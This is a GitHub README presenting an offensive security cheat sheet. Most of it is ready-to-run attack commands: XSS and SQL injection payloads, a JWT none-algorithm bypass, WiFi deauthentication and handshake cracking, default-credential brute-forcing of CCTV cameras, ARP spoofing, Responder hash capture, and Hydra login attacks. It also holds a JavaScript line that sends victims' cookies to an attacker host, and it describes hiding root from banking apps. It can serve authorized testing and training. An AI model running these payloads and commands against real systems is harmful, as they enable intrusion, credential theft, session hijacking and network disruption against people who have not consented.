# Penetration-testing-toolkit
A comprehensive collection of essential ethical hacking tools, penetration testing commands, and security cheat-sheets for Red teaming and Web App Pentesting.

# 🛠️ Advanced Pentesting & Bug Bounty Playbook

A highly comprehensive, enterprise-grade collection of advanced penetration testing commands, automated reconnaissance workflows, IoT/CCTV security auditing, and live Bug Bounty methodology curated by **Shubham Patel ([techindro](https://github.com))**. This repository serves as an operational reference playbook for Web Application Security, Network Auditing, Cloud Infrastructure, and Red Teaming engagements.

> **⚠️ DISCLAIMER:** This repository is strictly for educational purposes, authorized research, and defensive security auditing. Performing unauthorized attacks or scanning networks without explicit, written permission/scope is completely illegal and punishable by law.

---

## 📌 Arsenal Core Blueprint
* [1. Live Bug Bounty Hunting & Automation](#1-live-bug-bounty-hunting--automation)
* [2. Web App Exploitation (XSS & SQL Injection)](#2-web-app-exploitation-xss--sql-injection)
* [3. API Security & Token Manipulation](#3-api-security--token-manipulation)
* [4. Cloud Security Auditing (AWS)](#4-cloud-security-auditing-aws)
* [5. Wireless Auditing (WiFi Hacking)](#5-wireless-auditing-wifi-hacking)
* [6. IoT & CCTV Firmware Security Auditing](#6-iot--cctv-firmware-security-auditing)
* [7. Network Spoofing & MITM Vectors](#7-network-spoofing--mitm-vectors)
* [8. Active Directory & Windows Pentesting](#8-active-directory--windows-pentesting)
* [9. Authentication Attacks & Brute Force](#9-authentication-attacks--brute-force)
* [10. Mobile Sec & KernelSU Next (KSUN)](#10-mobile-sec--kernelsu-next-ksun)

---

## 1. Live Bug Bounty Hunting & Automation

Advanced workflows for asset discovery, automated vulnerability scanning, and testing at scale across platforms like HackerOne and Bugcrowd.

### Subdomain Recon & Mass Probing
```bash
# Enumerate subdomains using Subfinder
subfinder -d target.com -o subdomains.txt

# Probe for active HTTP/HTTPS servers with status codes
httpx -l subdomains.txt -status-code -title -silent -o alive_subs.txt
```

### Automated Template Scanning (Nuclei)
```bash
# Scan live assets for high and critical severity vulnerabilities using community templates
nuclei -l alive_subs.txt -severity high,critical -o nuclei_results.txt
```

### Parameter Discovery for XSS/SQLi/SSRF
```bash
# Fetch URLs from wayback machine and archive history, then clean up
waybackurls target.com | grep "\?" | uro > parameters.txt

# Find hidden parameters using Katana or Gau
katana -u https://target.com -jc -d 3 -o katana_urls.txt
```

---

## 2. Web App Exploitation (XSS & SQL Injection)

### Cross-Site Scripting (XSS) Payloads
Testing inputs for execution of malicious scripts in client browsers.
* **Stored/Reflected XSS:** `<svg onload=alert(document.domain)>`
* **DOM-Based XSS:** `javascript:alert(1)` via vulnerable inputs like `window.location.hash`.

### SQL Injection (SQLi)
```bash
# Automated SQLi testing using sqlmap
sqlmap -u "http://target.com" --dbs --batch --random-agent

# Manual Auth Bypass strings
' OR '1'='1' --
' UNION SELECT null, username, password FROM users --
```

---

## 3. API Security & Token Manipulation

Auditing RESTful APIs, JSON Web Tokens (JWT), and Mass Assignment vulnerabilities.

### JWT Exploitation
* **None Algorithm Attack:** Modify the JWT header to `{"alg":"none"}` and remove the signature part to bypass authentication.
* **Brute-forcing weak JWT Secret keys:**
```bash
jwtcat -t <JWT_TOKEN> -w /usr/share/wordlists/rockyou.txt
```

### API Endpoint Fuzzing
```bash
# Fuzz hidden API endpoints using ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com -mc 200,403
```

---

## 4. Cloud Security Auditing (AWS)

Identifying misconfigured cloud resources, leaked secrets, and public storage buckets.

### Misconfigured S3 Buckets
```bash
# List contents of an insecure publicly readable AWS S3 bucket
aws s3 ls s3://target-bucket-name --no-sign-request

# Check for write permissions (File Upload vulnerability)
aws s3 cp test.txt s3://target-bucket-name/test.txt --no-sign-request
```

---

## 5. Wireless Auditing (WiFi Hacking)

### WPA/WPA2 Handshake Capture (Aircrack-ng Suite)
```bash
# Monitor surrounding wireless access points
airmon-ng start wlan0
airodump-ng wlan0mon

# Capture specific network handshake targeting a BSSID
airodump-ng -c <channel> --bssid <BSSID> -w capture_file wlan0mon

# Force deauthentication to kick clients and grab handshake instantly
aireplay-ng -0 10 -a <BSSID> -c <Client-MAC> wlan0mon

# Offline brute-force using a custom wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture_file-01.cap
```

---

## 6. IoT & CCTV Firmware Security Auditing

Analyzing embedded network systems, RTSP stream flaws, and searching for hardcoded credentials inside network camera devices.

### Discovering IoT & Camera Port Vectors
```bash
# Scan for common CCTV/RTSP streaming ports (554, 80, 8080, 5544)
nmap -p 554,80,8080 -sV <target-subnet>

# Testing default vendor credentials on network interfaces
medusa -h <target-ip> -u admin -P default_camera_passwords.txt -M http
```

### Firmware Extraction & Password Searching
```bash
# Extract the filesystem from a camera firmware binary
binwalk -e firmware.bin

# Search extracted files for hardcoded telnet/ssh keys or hashes
grep -rn "passwd" ./_firmware.bin.extracted/
```

---

## 7. Network Spoofing & MITM Vectors

### ARP Spoofing (Man-In-The-Middle)
```bash
# Enable IP forwarding on the host machine
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison Target Client and Gateway
arpspoof -i wlan0 -t <Target-IP> <Gateway-IP>
arpspoof -i wlan0 -t <Gateway-IP> <Target-IP>
```

### Session Hijacking via XSS Exfiltration
```javascript
// Exfiltrate active state cookies to an external listener
new Image().src="http://<Attacker-IP>/log?cookie=" + document.cookie;
```

---

## 8. Active Directory & Windows Pentesting

Essential commands for lateral movement and domain escalation inside corporate internal networks.

### LLMNR/NBT-NS Poisoning (Responder)
```bash
# Capture NetNTLM hashes by listening to local network broadcasts
sudo responder -I eth0 -dwv
```

### Password Cracking (Hashcat)
```bash
# Crack NetNTLMv2 hashes captured from the network using RockYou wordlist
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 9. Authentication Attacks & Brute Force

### Web Login Brute-Forcing (Hydra)
```bash
# Attack a HTTP-POST form login page
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"
```

### Protocol & Directory Brute-Forcing
```bash
# Brute forcing SSH credentials
hydra -L users.txt -P passwords.txt ssh://<target-ip> -t 4

# Network directory brute forcing using Gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
```

---

## 10. Mobile Sec & KernelSU Next (KSUN)

Advanced kernel adjustments to handle strict sandboxing in modern application environments.

* **KernelSU Next integration:** Implementing SUSFS mechanisms inside custom kernels to conceal tool directories and root modifications from production financial apps.
* **Dynamic Hooking Instrumentation:**
```bash
# Injecting JavaScript to dynamically intercept and bypass root detection
frida -U -f com.target.app -l bypass_root.js
```

---
**👨‍💻 Maintainer:** [Shubham Patel (techindro)](https://github.com)

